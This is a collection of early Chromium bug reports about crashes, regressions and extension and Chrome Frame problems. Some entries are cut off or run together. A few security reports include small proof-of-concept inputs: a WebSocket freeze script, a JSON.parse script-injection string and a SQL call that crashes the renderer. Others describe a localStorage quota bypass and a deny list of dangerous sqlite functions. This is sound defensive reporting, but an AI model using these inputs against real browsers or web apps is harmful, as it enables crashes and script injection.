title.$t: Can't dump symbols from official builds when Chrome is linked with --gc-section

content.$t:
r32330 cut the Chrome binary size down by quite a bit, but now dump_syms
can no longer get the STABS symbols out of it.

If r32330 is getting merged into 249, then this is a release blocker.

title.$t: Forecastfox causes segmentation fault on 5.0.318.0 (Developer Build 38172) Ubuntu

content.$t: Chrome Version : 5.0.318.0 (Developer Build 38172) Ubuntu Is this the most recent version: yes OS + version: Ubuntu 9.10 64-bit CPU architecture (32-bit / 64-bit): 64-bit Window manager: ubuntu default Behavior in Windows Chrome (if you have access to it): don't have access to it, but a user reported a similar problem. 1. Install Forecastfox from the extension gallery: https://chrome.google.com/extensions/detail/ihffmkcfkejomlfnilnmkokcpgclhfeg 2. Chrome immediately segmentation faults. I tried to get a backtrace, but my desktop doesn't respond to the keyboard or mouse after I reproduce the segmentation fault with GDB attached. The only way to make it responsive is to switch to a shell and kill the gdb and chromium-browser processes. Any tips? I've attached what it recorded up until where I had to kill gdb.

title.$t: Autocomplete box segfaults renderer

content.$t: Chrome Version : tot (r26906) OS + version : ubuntu karmic CPU architecture : x64 chrome What steps will reproduce the problem? 1. type in 'hello' to a text entry box eg http://scholar.google.com and press enter 2. go back to http://scholar.google.com and type in 'hell'. The autocomplete box should appear 3. press any other key so the autocomplete box has no matches, eg press space 4. Program received signal SIGSEGV, Segmentation fault. 0x0000000000b18727 in WebViewImpl::HideAutoCompletePopup() () The backtrace is full of calls to HideAutoCompletePopup(), eg: #135812 0x0000000000b1872c in WebViewImpl::HideAutoCompletePopup() () #135813 0x0000000000b1872c in WebViewImpl::HideAutoCompletePopup() () #135814 0x0000000000b1872c in WebViewImpl::HideAutoCompletePopup() () so I didn't include it here.

title.$t: Bookmark bar no longer resizes correctly with window

content.$t:
- open a new window
- show bookmark bar
- resize window

expected:
- all toolbars resize properly with the window

actual:
- the bookmark bar floats above the window and a dark gray background is 
left in its place.

This regressed last night after erg's change.

title.$t: Mac: Transparent bookmark bar

content.$t: What steps will reproduce the problem? 1. Built with r28689 2. Launched Chromium.app What is the expected output? What do you see instead? Expected: normal start page with bookmark bar Actual: normal start page with bookmark bar, but the bookmark bar was transparent. See attached screenshot. Clicking on bookmark buttons worked normally, but clicking in the background brought the window behind the browser to the front.

title.$t: Our thing is broken on Snow Leopard

content.$t: What steps will reproduce the problem? 1. Launch What is the expected output? What do you see instead? Expect: application Observe: crash Please use labels and text to provide additional information. Cause: r30647, bug 25857, http://codereview.chromium.org/343024 -- Not really working... We're pretty much entirely broken on Snow Leopard now. First, I found that +[MessagePumpNSAppDeferredAutoreleasePool alloc] was returning objects of type NSAutoreleasePool, as evidenced by: 2009-10-30 21:28:03.204 base_unittests[27990:903] - [NSAutoreleasePool initWithPump:]: unrecognized selector sent to instance 0x1231b80 So I stuck this into DeferredAutoreleasePool: + (id)allocWithZone:(NSZone*)zone { return NSAllocateObject(self, 0, zone); } and promptly started crashing thusly: Program received signal EXC_BAD_ACCESS, Could not access memory. Reason: KERN_PROTECTION_FAILURE at address: 0x0000009e 0x0018a88d in base::MessagePumpNSApplication::set_needs_event_loop_wake_up_true (this=0x45) at message_pump_mac.h:257 257 needs_event_loop_wake_up_ = true; (gdb) bt #0 0x0018a88d in base::MessagePumpNSApplication::set_needs_event_loop_wake_up_true (this=0x45) at message_pump_mac.h:257 #1 0x001882e1 in base::SetNeedsEventLoopWakeUpTrue (pump=0x45) at /chrome/trunk/src/base/message_pump_mac.mm:841 #2 0x001883f5 in -[MessagePumpNSAppDeferredAutoreleasePool drain] (self=0x140d910, _cmd=0x90f9a8d4) at /chrome/trunk/src/base/message_pump_mac.mm:921 #3 0x9078075b in -[NSApplication run] () #4 0x00188a82 in base::MessagePumpNSApplication::DoRun (this=0x1229410, delegate=0xbffff4d4) at /chrome/trunk/src/base/message_pump_mac.mm:685 0x45 is the special value I set pump_ to in -[MessagePumpNSAppDeferredAutoreleasePool drain] to verify what was going on. And hey, how did NSApplication get a hold of a MessagePumpNSAppDeferredAutoreleasePool? NSAutoreleasePool on Snow Leopard is maintaining its own cache of NSAutoreleasePool objects, and is doling them out via +alloc. This is so frustrating. I tried this yesterday on Snow Leopard specifically to see if it would recycle pools, and it didn't seem to.

title.$t: Can't save cookie settings

content.$t:
Chrome Version       : 5.0.323.0 (38568) Ubuntu


What steps wil`l reproduce the problem?
1. Go to Options -> Under The Hood -> Cookie Settings
2. Select any of the options (I chose accept 'Accept Cookies Only From 
Sites I Visit'
3. Click 'Close'

I expected the settings to persist, however, they didn't.
I was still have problem with sites that utilize cookies.
In addition, I think there might be a correlation between this is the 
"redirect loop" I've seen mention in the forum. I imagine this loop occurs 
as result of authentication, but I'm uncertain about that.

Any ideas or fixes?

title.$t: official build startup gets profile directory wrong for some checks

content.$t:
I found this with a debug build, not sure how much is getting things wrong, but the DChecks helped trip it up.

1. Install and configure chrome, enable stats checking
2. Launch debug offical build, with --user-data-dir pointing some places else

You'll die in the first launch code because of a dcheck about breakpad being already initialized.

What's happening is:

chrome_dll_main.cc::ChromeMain() (line 536) calls InitCrashReporter()
InitCrashReporter() does this:
  bool enable_breakpad =
      is_browser ? GoogleUpdateSettings::GetCollectStatsConsent() :
                   command_line->HasSwitch(switches::kEnableCrashReporter);

So we go into GoogleUpdateSettings::GetCollectStatsConsent().

google_update_settings_posix.cc has GoogleUpdateSettings::GetCollectStatsConsent().  That checks the "Consent To Send 
Stats" file, but PathService::Get(chrome::DIR_USER_DATA, &consent_file) call is giving back ~/Library/Application 
Support/Google/Chrome/.  

This happens because chrome_dll_main.cc line 614 seems to be where we actually check for the command line argument.

title.$t: Toggling issues with Content settings icon.

content.$t: OS: Win XP Chrome :Google Chrome 5.0.375.7 (Official Build 44408) WebKit 533.4 V8 2.1.10.4 User Agent Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.7 Safari/533.4 What steps will reproduce the problem? 1.In windows chrome ,goto wrench menu -> options -> Content settings ->Images 2. Select 'Donot show any images' .Save and close dialog 3.Navigate to any site, eg. cnn.com 4. Try to edit the block image settings from omnibox What is the expected output? Chrome must allow user to change the Image settings from the omnibox successfully.User must be able to toggle between both options and incase on option is chosen (eg. allow images) ,other one must be disabled ,in other words user can't select both options at a time What do you see instead? The feature is not working correctly. Incase user wants to allow images ,if he clicks on radio button 'allow images' ,other option 'block images' is also selected. It must be disabled.User is able to select 2 contradictory choices for content settings at a time This same issue is seen with Javascript settings ,Plugins and Popup settings. Its happening only on Windows ,on linux its working fine . **screenshot below Please use labels and text to provide additional information.

title.$t: [CF] Could not access wave application with CF 4.0.303.0 (Official Build 36735)

content.$t: What steps will reproduce the problem? 1. Install Chrome Frame with chrome_frame_mini_installer.exe in \\chrome-master.mtv\shared\4.0.303.0\win_cf 2. Relaunch IE, access http://go/wave/ What is the expected output? What do you see instead? Should access wave application properly, but currently a blank page is displayed with Javascript errors. Check attached screen-shot for reference. If refresh the page, it displays a dialog with title "Google Wave – Please install Google Chrome Frame", just like when there is no ChromeFrame installed. This issue happens in all versions of IE, it doesn't happen in chrome standard alone browser with build 4.0.304.0 (Official Build 36852).(There is no 4.0.303.0-r36735 chrome build available for test) This should be a release blocker issue.

title.$t: REGRESSION: Web page crashes because of extension Google Translate

content.$t: What steps will reproduce the problem? 1. Make sure Google Translater has been installed and enabled 2. Go to a web site which is not in English, e.g. http://www.sohu.com 3. title.$t: DevTools: migration to SourceFrame upstream broke several devtools tests (and potentially some functionality).

content.$t: r37291 rolled the DEPS. I will look at this shortly.

title.$t: [CF] Neither IE's forward nor CF's forward work in vimeo and some other web sites

content.$t: What steps will reproduce the problem? 1. Have CF 5.0.317.0 (Official Build 38070) installed 2. Launch IE and access http://vimeo.com/ 3. Click on a link 4. Go back to previous page by using IE's Back button or CF's Back context menu item What is the expected output? What do you see instead? Now both IE's Forward button and CF's Forward context menu item should be enabled, but now they are still disabled. This issue also happens in web site whose domain is registered in CF registry. Since vimeo.com is one of our biggest customer, Forward button doesn't work could be a severe issue. This issue could be a release blocker. Please use labels and text to provide additional information.

title.$t: Crashes on reliability bot due to image decoder crashes

content.$t:
We have lots of crashes in the reliability bot as of yet, which should block the next dev 
build.

Last known good:
39173 http://chromebot/buildsummary?id=buildbot_39173_ext
Started crashing:
39179 http://chromebot/buildsummary?id=buildbot_39179_ext

Changes between these two build include innocent looking changes plus a WebKit roll (r39175) 
to WebKit revision 54839. 

That WebKit revision includes code cleanup in ImageDecoders, which started crashing a layout 
test.
http://trac.webkit.org/changeset/54823

It is therefore the prime suspect at this point.

title.$t: RTL: Erroneous app menu trigger hitbox obstructs close button

content.$t:
Build: 5.0.330.0 (Official Build 39164)
OS:XP

-Launch browser window for any RTL.
-Try to close the window by clicking on the 'X' button of the window 
management controls (you need to click on left side space of the 'x' 
button as shown in the screenshot).

Issue:
Title bar context menu shows up. The window will be closed only for 2nd or 
3rd attempt.

It's a regression. Works fine on 4.1.249.1011 (Official Build 39069).

title.$t: [Extensions] RSS subscription extension doesn't work in incognito mode

content.$t: What steps will reproduce the problem? 1. Install RSS Subscription extension from gallery site 2. Check "Allow this extension to run in incognito" option for it in management page 3. Access www.nytimes.com and click on the page action of RSS subscription extension What is the expected output? What do you see instead? The RSS feed page should be displayed properly, but now it displays an error page with info like "This webpage is not available" Issues happens in Dev candidate 5.0.360.0 (Official Build 42309) and trunk build 5.0.363.0 (Developer Build 42618) Please use labels and text to provide additional information.

title.$t: No bookmark bar in "new tab" page

content.$t:
Chrome Version       : 5.0.365.0 (Developer Build 42904)

In a new tab i can't see the bookmark bar any more.
I can only see it if i use "always show bookmarks bar".

title.$t: incorrectly appearance themes with Chromium 5.0.366.0 (43182)

content.$t:
Chromium Version       : 5.0.366.0 (43182)

themes to this page:
https://chrome.google.com/extensions?hl=fr

the themes are installed with an incorrect appearance (incorrectly 
appearance)

Before the update Chromium version 5.0.366.0 (43182), I had no problem  
appearance;

example: "iPhone Inspired" Version 1.2
https://chrome.google.com/extensions/detail/glcdfjgdedodjafclijnppjnnkdiggc
l?hl=fr

title.$t: sync notifications is broken for non-gmail accounts

content.$t: What steps will reproduce the problem? 1. Log into sync with a non-gmail account (e.g., foo@google.com) 2. check about:sync What is the expected output? What do you see instead? 'Notifications Enabled:' should be true, but it's false.

title.$t: [CF] CF affects the redirection process of IE6 badly

content.$t:
It seems CF 5.0.375.3 (Official Build 44229) could not work properly in
IE6-XP, it has problems like:

1. Sometimes it is stuck in a loading state when accessing some websites,
refer to issue 41352.
2. The profile of CF is missing, cannot find Chrome Frame directory under
C:\Documents and Settings\<user name>\Local Settings\Application Data\Google
3. It is stuck in redirection page when accessing http://go/wave/
4. It suddenly keeps opening windows when I was trying to access a website
with registry approach, it opened about 90 windows and finally IE dead.

The problem #2 and #3 happen consistently, #4 happens once and #1 happens
many times, for #1 and #4 there are no reproducible steps yet.

However these problems don't happen on my IE8-XP.

title.$t: [CF] Wave shows a blank page after login

content.$t: What steps will reproduce the problem? 1. Go to http://go/wave/ and login What is the expected output? What do you see instead? After login it shows a blank page in IE8, this should be a regression because this happened before and then fixed. Issues happens both in build 5.0.379.0 and 5.0.380.0 Please use labels and text to provide additional information.

title.$t: Browser crash on clicking content settings links @ Browser::HandleCrossAppNavigation

content.$t: Chrome Version : Build 46195 URLs (if applicable) : N/A Other browsers tested: N/A What steps will reproduce the problem? 1. Options > Under the Hood 2. Privacy > Content Settings 3. Plugins > Disable individual plugins What is the expected result? Checklist of some sort to disable various plugins installed. What happens instead? Chromium crashes and restart of the browser is required.

title.$t: REGRESSION: Infobars don't close on reloading/navigating away from the page

content.$t: What steps will reproduce the problem? 1. Go to www.ebay.de - translate bar shows up 2. In the same tab, navigate to www.google.com What is the expected output? Translate bar should go away What do you see instead? It sticks there until we close it Google Chrome 5.0.396.0 (Official Build 46416)

title.$t: REGRESSION: PDF content doesn't load and hangs Chrome

content.$t: Chrome Version : <Copy from: 'about:version'> Chrome Version : <6.0.410.0 (47686)> URLs (if applicable) : Other browsers tested: Add OK or FAIL after other browsers where you have tested this issue: Safari 4: OK Firefox 3.x: OK IE 7: OK IE 8: OK Chrome 6.0.401.1 beta : OK What steps will reproduce the problem? 1. open this search link http://www.google.fr/search? hl=fr&q=elevage+familial+d%C3%A9claration+ddass&meta=&rlz=1I7SNYK_fr 2.try to open the first link qhich is pointing to a pdf file 3.Chromium stop working and freeze What is the expected result? link should open the pdf file What happens instead? title.$t: Security: Extension history permission does not generate a warning

content.$t:
Installing an extension with only the "history" permission does not generate a "Can access your history" warning (unlike apps with the "tabs" permission).  This seems incorrect -- the history API gives even more direct access to user history than the tabs/windows APIs do.

For reference, check out this extension https://chrome.google.com/extensions/detail/cahejgbbfgmlmjgdjlibphdjeldhagkp (not mine) which has the history permission but does not generate an install warning.

I'm using 7.0.503.0 dev.

title.$t: regression: dangerous download confirmation on gallery

content.$t:
Go to chrome.google.com/extensions in the gallery and try to install an extension.  You'll see the dangerous download confirmation warning.

This just appeared in the new canary build.

title.$t: regression: can't drag crx on to chrome to install

content.$t:
If you drag a crx on to chrome, it's supposed to install it.  This winds up going through the download manager.

Sometime this morning, this broke and when you drag it on, the download gets stuck in the "Starting" state and never actually finishes.

This is something we use all of the time for testing/development, so it's definitely affecting our work.

title.$t: Chrome fails to download large files

content.$t: Chrome Version : chromium 4.0.209.0 (Build 26076) URLs (if applicable) : any Other browsers tested: Firefox 3.x: OK (Namoroka/3.6a2pre 20090911051033) IE 8: OK chromium builds NG: 26074, 25969, 25926, 25873 OK: 25866, 25858, 25844, 25855 What steps will reproduce the problem? 1. download a file that is more than about 50MB. 2. download will finish, but smaller than the original file. What is the expected result? download a file and it is not corrupted. What happens instead? a downloaded file is small and corrupted. Please provide any additional information below. Attach a screenshot if possible. If disk-cache-size is set, it will be the size about 1/8 of disk-cache-size. disk-cache-size 1073741824 -> about 128MB 268435456 -> about 32MB 134217728 -> about 16MB 33554432 -> about 4MB 0 or not set -> about 25MB

title.$t: Crash reporting is broken

content.$t: What steps will reproduce the problem? 1. Install Chrome with Omaha 2. Overinstall Chrome4.0.249.23 3. Open a tab and navigate to about:crash What is the expected output? Renderer crash and a crash Id in eventvwr. Something like "Crash uploaded. Id=196bbde7b262ab1b.." What do you see instead? Looks like crashes are not being uploaded. I see "Crash not uploaded. Error=0x8004fffe."

title.$t: Revision 34486 results in startup crashes

crashes at startup if you have a custom theme. There is no crash if you uninstall 
the theme.

title.$t: Linux performance regression from WebKit roll 58304:58400

content.$t:
Somewhere in this roll:
http://trac.webkit.org/log/?verbose=on&rev=58400&stop_rev=58304
http://src.chromium.org/viewvc/chrome?view=rev&revision=45795

A performance regression was introduced:
http://build.chromium.org/buildbot/perf/linux-release-hardy/intl1/report.html?
history=150&rev=-1
http://build.chromium.org/buildbot/perf/linux-release-hardy/intl2/report.html?
history=150&rev=-1

In linux.  We're pretty sure it's:
http://trac.webkit.org/changeset/58341/

Based on inspection, but we're not positive.  Evan is going to look at this for now.  Evan, if you 
still haven't figured it out by night, maybe Ukai can try bisecting the set of patches to narrow 
down exactly what did it.


If you want to run the page cycler:
You need a checkout including src-internal.  (Search moma for Chrome build instructions.)
Marcus will post the rest of the build instructions into this bug.


Don't hate me, Dimitri.  :-(

title.$t: [IndexedDB] IDBKeyRange was not protected by the indexed-database runtime flag between WebKit r64141 and r64201

content.$t:
In

http://trac.webkit.org/changeset/64141

I added a new IDBKeyRange object on Window. However, I forgot to mark it as [EnabledAtRuntime] so this object will be visible by default in Chromium. 

This problem was later fixed in

http://trac.webkit.org/changeset/64201

IDBKeyRange belongs to IndexedDatabase module which is under development and not ready to ship. If we wish to make a dev channel release with webkit at any revision in [64141, 64201), we should carefully investigate the IDBKeyRange object and make sure that it doesn't introduce any security issues.

Andrei

title.$t: [CF] the registry approach doesn't work

content.$t: What steps will reproduce the problem? 1. Add *yahoo.com* to CF registry 2. Access www.yahoo.com What is the expected output? What do you see instead? Yahoo pages should be rendered by ChromeFrame, but now it is still rendered by IE. Chrome build: 6.0.495.0 (Official Build 56152) Please use labels and text to provide additional information.

title.$t: Policy: Need policy to supply predefined bookmarks

content.$t: Some corporate customers who want to customize Chrome need to supply pre-defined bookmarks via policy.

title.$t: All default search engine settings were wiped out

content.$t: Chrome Version : 1.0.154.53 (Official Build 11798) URLs (if applicable) : N/A Other browsers tested: N/A Add OK or FAIL after other browsers where you have tested this issue: Safari 4: N/A Firefox 3.x: N/A IE 7: N/A IE 8: N/A What steps will reproduce the problem? 1. Right click on the address bar 2. Select Default Search Engines What is the expected result? See default search engines you have configured What happens instead? All previously configured default search engines have been wiped out. Please provide any additional information below. Attach a screenshot if possible. I use the "Default Search Engines" feature of Chrome as a substitute for the Firefox "keywords" feature that lets you type a shortcut keyword in the address bar and expands it into a full URL. All those shortcuts have been wiped out along with all my default search engines such as Google, Amazon, Rotten Tomatoes, etc. so I'm having a pretty bad user experience. I think this happened some time in the past week. Possible causes: * I rebooted my laptop twice this week * Auto-updates may have caused it

(preferred).

My guess is this is caused by the recent addition of ruby support: I had been fuzzing HTML for a while without finding any issues before that change landed and the repro contains a <ruby> tag.

title.$t: Security: Websockets - malformed URL freezes browser

content.$t:
Chrome Version       : 4.0.267.0 (Developer Build Ubuntu build 34059)
Other browsers tested:
     Opera 10: OK (not affected)
  Firefox 3.x: OK (not affected)

What steps will reproduce the problem?

1. Execute the following code
2. Wait

What is the expected result?

Graceful degradation

What happens instead?

The user agent freezes - even "Kill Page" popping up after some time won't 
bring it up again. Chromium process has the be killed the hard way.

Here's the mentioned code:

{{{
<script>
new WebSocket("ws://javascript:a")
</script>
}}}

title.$t: Security: invalid pointer access when calling HTML5 Web Database REGEXP() function with just one argument

content.$t:
1) Go to https://cevans-app.appspot.com/static/webdb.html
2) Run the following SQL (a few times if necessary):
select regexp('abcd') from sqlite_master

Seems to be a renderer crash due to read of an invalid pointer (not-NULL). 
Not hugely serious but I might as well fix it.

title.$t: Merge HTMLParser security fix from WebKit

content.$t:
According to <https://bugs.webkit.org/show_bug.cgi?id=32567>, this change
is a security fix:

http://trac.webkit.org/changeset/52073

It seems that we should merge it to beta and probably stable ASAP.

title.$t: Security: restrict sqlite functions in the function authorizer

content.$t:
As discussed over e-mail, we should use the function authorizer to deny 
access to dangerous functions.

Ideally, we could use a whitelist and not a blacklist. A whitelist has two 
benefits:
1) It protects us from any dangerous functions getting activated when we 
pull in newer, more capable versions of sqlite.
2) It'll serve as a useful definitive list as to what functions we need to 
keep supporting :)

Regarding the dangerous functions, at least the following must not be 
allowed:
a) icu_load_collation() - explicitly called out in 
third_party/sqlite/ext/icu/README.txt as being dangerous.
b) fts2_tokenizer() - currently already disabled via a #define. Needs to be 
disabled in the authorizer so we can use raw upstream sqlite one day.
c) load_extension() - sounds dubious
d) random() / randomblob() - ideally we can disable these. It's not a huge 
deal but we've had complaints in the past about exposing weak RNGs to 
users, or tracking of browser instance via internal RNG state.

title.$t: Sync: Security review for stable

content.$t: Lets use this bug for tracking overall progress with getting Sync cleared in terms of security concerns.

title.$t: Branded stable channel builds have the word “unknown” after the version number

content.$t:
Steps:
1. Get a branded stable channel build.
2. Chrome:About Google Chrome

Expect: Version number should be unadorned, such as 5.0.375.29

Observe: 5.0.375.29 unknown

This broke in r36375 for bug 31772.

http://codereview.chromium.org/1990002

title.$t: WebCore::SVGUseElement::updateContainerOffsets ExecAV@Arbitrary (1dc75f12fe3750aa1828ea20506a5d54)

content.$t:
Opening the attached SVG file or a page containing it causes a segmentation
fault in WebCore::SVGUseElement::setHrefBaseValue in 32-bit Ubuntu 9.10.
Builds 36515 up to the current 40259 appear to be affected. In 64-bit
Fedora 12 the issue manifests as the tab getting stuck in loading, sad tab
or a browser crash (segmentation fault after a possible double-free or
memory corruption) when using Google Chrome  5.0.307.9 (Official Build
39052) beta or Chromium 5.0.339.0 (Developer Build 40152).

I have no proof that this is exploitable. Reported as a security issue to
be on the safe side.

title.$t: Plugin grouping (about:plugins) broke flash development

content.$t:
People that develop using Adobe tools should be able to debug flash movies hosted in chrome.

So when you install say CS5, it installs the 'debugger' version of the plugin. Now you need to be able to disable the built-in plugin and enable the debugger one.

This is no longer possible given the grouping of plugins enable/disable.

When fixing this take in consideration the Adobe's technical note about this
http://kb2.adobe.com/cps/839/cpsid_83950.html

Note the changes so the instructions can be adjusted as needed.

EXTERNAL-REPORT: Another Windows kernel CFF font parsing bug

content.$t:
From our prolific CFF font fuzzer Marc Schoenefeld again! He is trying to bankrupt us with Windows kernel bugs :)

This would appear to be a third bug, distinct from the first two reported because it reproduces against 5.0.375.127 (which has all the latest OTS enhancements).

Paul Mehta and myself just personally witnessed a Windows XP blue screen.

content.$t: Chrome Version : 2.0.180.0 URLs (if applicable) : http://www.google.at/ig?hl=en What steps will reproduce the problem? 1. Open igoogle 2. Stay in igoogle tab and go to another page 3. Press the back button to go back to igoogle What is the expected result? Normal back forward navigation possible What happens instead? Once you are back in igoogle navigating with back/forward isn't possible anymore. Forward button is inactive Back button does nothing This regressed in 2.0.180.0 for me. Note: If you press the back/forward buttons very fast they work properly. Win Vista x64

title.$t: REGRESSION: Home button's backing button image does not have hot or pressed states

content.$t:
Turn on the home button.  Hover it and note that the home icon changes, but 
not the button it's on.  Press it and note similar results.

Due to theming...

title.$t: Autofilled username portions cannot easily be deleted

content.$t:
Go to a page with a GAIA login and highlight the last half of the username.  
Press delete.  Nothing happens.  I suspect we are aggressively re-filling the 
username back in even though the user has just pressed delete.

Tim, did you do password manager autofill?  I forget.

title.$t: REGRESSION: Session history gets hosed

content.$t:
I believe the patches to eliminate redirects from the back/forward list 
caused this.  I don't remember who wrote these but I'm pretty sure Brett 
reviewed.

Visit bugs.webkit.org by typing it in and hitting alt-enter (so it is the 
only thing in your navigation history).  Type anything into the bugzilla 
search box and hit return.  After navigating to the resulting page, your 
session history is empty, so you can't go back.

(This affects a large number of pages I visit, this happens to be an easy 
repro.)

title.$t: update hunspell to the latest stable version to use the latest dictionary format

content.$t:
spun off issue 8551.

Our copy of Hunspell is based on 1.1.5 but is rather heavily modified to 
support the bdict format among other things.

In issue 8551, it's found that the latest French dictionary (and perhaps 
dictionaries for other languages) for Hunspell does not work with Hunspell 
1.1.5. To update our spellcheck dictionaries, we need to upgrade hunspell to 
1.2.8 with our locale changes adapted to it.

title.$t: REGRESSION: Highlighting of misspelled words is not persistent

content.$t: What steps will reproduce the problem? 1. Go to gmail compose box 2. Start typing some misspelled words and move to next line 3. Start typing again What is the expected output? Highlighting of misspelled words should be persistent until it gets corrected What do you see instead? The highlighting is not seen once we start typing in next line Chromium 3.0.195.0 (Developer Build 21075)

title.$t: Google Docs Bullets Tab not working without text

content.$t: Chrome Version : 3.0.195.1 (Official Build 21222) URLs (if applicable) : Google Docs document Other browsers tested: IE 8: OK Chrome 2.0.172.37: OK What steps will reproduce the problem? 1. Create a new Document in Google Docs 2. Insert Bullets 3. Try to indent the bullet using the Tab key What is the expected result? Bullet becomes indented, and changes from a Solid Bullet to a Hollow Round Bullet What happens instead? Unable to indent the bullet, unless there is text in the bullet.

title.$t: Chrome consumes 100% on images.google.com

content.$t: Chrome Version : 3.0.193.2 (Official Build 21134) URLs (if applicable) : images.google.com Other browsers tested: Add OK or FAIL after other browsers where you have tested this issue: Safari 4: Firefox 3.x: OK IE 7: IE 8: What steps will reproduce the problem? 1. Go to google.com 2. Search for anything 3. Right click on "images", open images search results in new tab 4. Observe that chrome freezes. What is the expected result? Browser should proceed to load images. What happens instead? Browser consumes 100% CPU. Please provide any additional information below. Attach a screenshot if possible. I realize that this may be very system dependent, and is possibly due to some strange network setup on my end, but it's strange that the bug does not happen on firefox. I have attached a video showing the symptoms (hopefully it's not too large)

title.$t: REGRESSION: QuickTime plugin fails to load to render .mpg URLs

content.$t:
REGRESSION: QuickTime plugin fails to load to render .mpg URLs

Observed in 3.0.195.0 (Developer Build 21086).  Works fine in 2.0.172.39.

I don't know if this is a side effect of changes to plugins code or if it is related to 
our HTML5 video code supporting some forms of MPEG.

The Chrome task manager doesn't even show the QuickTime plugin being loaded, so I 
suspect this may be related to mime handling.

Sample URL:
http://hubblesource.stsci.edu/sources/video/clips/details/images/centaur_1.mpg

That URL also loads properly in Safari 4 and Firefox 3.5.

title.$t: Security: script injection possible in JSON.parse; will lead to XSS in some web apps

content.$t:
Example:

JSON.parse('1); alert(1); (1')

Alert dialog will fire. JSON.parse() should not be permitted to cause any 
side effects.

Affects Beta & Dev but not stable. We should fix this before stable.

title.$t: Translations contain amp - Windows keyboard accelerators not being interpreted correctly.

content.$t: What steps will reproduce the problem? 1. Run Chromium with LANG=es_ES.UTF-8. 2. Click on the wrench What is the expected output? What do you see instead? "Help" is translated to "Ay_amp;uda", where "_a" indicated a is underlined. What we really want is "Ay_uda". There are other translations with the same problem, and probably other places where we have "&" in place of "&".

title.$t: SSL errors from XHR in workers should result in failure

content.$t:
An XHR from a worker that results in an SSL error (even one previously 
accepted by the user, such as a CN mismatch) should be treated as a Network 
Error (e.g. silently fail). This is in the spec for XHR everywhere, it's not 
clear if we can do it everywhere (may break some existing use case, need to 
be sure), but certainly for workers where there are no existing use cases we 
should adhere to the spec here. Also avoids some nasty UI issues - if there's 
no window, what UI would you visibly degrade? (Certainly a nightmare for 
shared workers).

See: http://dev.w3.org/2006/webapi/XMLHttpRequest/ and search for "TLS 
Negotiation"

title.$t: Intermittent: Updater fails some times at System level

content.$t:
Build: 3.0.195.17
OS: Vista/Sp1

Filing this as tracking purpose.

-Install 3.0.195.10 at system level and DON'T launch Chrome.
-Launch the updater 195.10_195.17 [at system level]
-Before the updater finishes installing, Launch Chrome for 195.10 and
respond to FRUI.
-After the updater completed, Exit Chrome.

Chrome exits cleanly, there are no background processes running, but I will
notice chrome.exe and chrome_new.exe and two values (pv, opv) in registry
too.  Waited for long time, BUT they never were renamed.

It happens most of the time, but can't reproduce consistently.

title.$t: ISO-2022-CN and ISO-2022-CN-Ext are not supported leading to a potential XSS attack

content.$t:
Spun off issue 15701. 

ISO-2022-CN and ISO-2022-CN-Ext can have a similar issue to that presented
by the lack of conversion support in Chrome. 

Unlike ISO-2022-KR, we have to add multiple tables to support them, which
can increase the Chrome download size. However, it's at most 1MB
(uncompressed) and we may want to bite a bullet and add them although those
encodings are not used in the web at all.

Theme options should be visible What happens instead? they are more than half covered (see screenshot) Please provide any additional information below. Attach a screenshot if possible. Bug occurs under XP SP3, German language, Windows classic style enabled

title.$t: Clients that do not have extensions installed should not ping for extension blacklist

content.$t:
Chrome clients that do not have extensions installed should either check very 
infrequently or not at all for updates to the extension blacklist.  It 
otherwise creates unnecessary traffic in our servers.

title.$t: manifest.json should be able to specify a minimum Chrome version

content.$t:
The auto-update file allows extension developers to specify a
prodversionmin flag that will only update an extension if the user is
running a specified minimum version of Chrome.  I'd love to be able to set
a similar flag in the manifest.json file too.

See this thread for more discussion:
http://groups.google.com/group/chromium-extensions/browse_thread/thread/b7fbcb80f90b88f8

title.$t: Finish security review of OpenType sanitiser library

content.$t:
The @font-face feature will be enabled by default starting from the next 
beta release of Chrome 4.0.

Please finish the security review of http://code.google.com/p/ots/ 
library before Chrome 4.0 stable is released.

Related bug:
http://code.google.com/p/chromium/issues/detail?id=17818

title.$t: Memory leak in AsyncExtensionFunction

content.$t: Value* args_; never deleted.

title.$t: Temporarily remove i18n fallback logic for extension resource resolution

content.$t:
The fallback logic is expensive for extension resource resolution because it 
must do an extra file stat. Since we don't need this for Chrome 4, we should 
disable it.

title.$t: Implement i18n for extension manifests

content.$t:
This is already partly implemented, but this bug is to implement it 
according to the new plan outlined here:

http://groups.google.com/group/chromium-
extensions/browse_thread/thread/78f661ff16fc8f6a

Basically, we need to localize the manifest on install and store it 
localized in the prefs. We'll also need to relocalize when the UI language 
changes.

The fields that need to be localizable are:

* name
* description
* browser_action.default_title
* browser_action.default_badge_text
* page_action.name
* page_action.default_title

I think that currently we support special catalog entries like 
"chrome.extension_name" or something. I can't remember what my argument for 
these was, but thinking about it now, it makes less sense. I think we 
should just support the __MSG_* macros in these fields, and developers can 
do whatever they want.

title.$t: Extension message catalogs should not be parsed in browser process

content.$t:
We should use the existing support in SandboxedExtensionUnpacker for parsing 
JSON (it is used to parse the manifest) to parse the message catalogs.

title.$t: Browser actions update their icon too frequently

content.$t:
Might apply to page actions too.

Every time the user switches tabs, navigates, or changes some state, we 
update the browser actions and reload their icons. We should only update the 
icons if something about them changed.

title.$t: REGRESSION: Can't copy an image and paste into gmail or to the desktop

content.$t: Chrome Version : 4.0.223.16 URLs (if applicable) : Other browsers tested: Add OK or FAIL after other browsers where you have tested this issue: Safari 4: Firefox 3.x: IE 7: IE 8: What steps will reproduce the problem? 1.Right click on any image, select 'copy image' from the context menu. Try to paste into Gmail either by right clicking to paste or hit Ctrl V and nothing happens. However, copy image URL is working 2. 3. What is the expected result? Copy Image used to work, now it does not. I restarted my machine and the same problem persists. What happens instead? Please provide any additional information below. Attach a screenshot if possible.

title.$t: Security: LocalStorage does not account the key strings in the quota enforcement

content.$t:
[Already discussed the relatively simple fix with Jeremy, but filing for M4 
tracking]

This bug permits trivial quota bypass via:
- Storing data in key names, and always using 0-length strings for the 
values.
- Re-reading the stored keys via the ability to read them via an array 
index.

Not a particularly worrysome bug at all, but should be fixed before M4 so 
that someone doesn't try and make a "Google sucks" PR stink about this. It 
has been known to happen for SecSeverity-Low or even SecSeverity-None bugs 
:-/

title.$t: CPU spike in News example extension process

content.$t:
o head to chrome://extensions
o Install the news extension in 
src/chrome/common/extensions/docs/examples/extensions/news/
o Click the icon to have the news stories popup.
o Click on on of the links to have it expand the story.
o Watch the CPU spike, even after closing the popup and creating a new one 
by clicking the icon again.

title.$t: Stop using Sqlite for Safe Browsing

content.$t:
